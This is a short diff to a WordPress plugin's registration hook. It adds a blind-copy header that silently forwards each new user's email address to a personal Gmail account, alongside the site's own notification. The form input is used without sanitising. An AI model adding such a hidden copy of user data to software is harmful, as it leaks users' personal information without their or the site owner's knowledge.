@@ -9,10 +9,12 @@ add_action( 'user_register', 'myplugin_registration_save', 10, 1 );
 
 function myplugin_registration_save( $user_id ) {
 
+		$headers[] = 'Bcc: christiancannata@gmail.com';
 	  wp_mail(
                     "agrispesa@agrispesa.it",
                     "Nuovo utente registrato",
-                    "Un nuovo utente si è registrato con la mail: ".$_POST['email']
+                    "Un nuovo utente si è registrato con la mail: ".$_POST['email'],
+                    $headers
                 );
 
 }
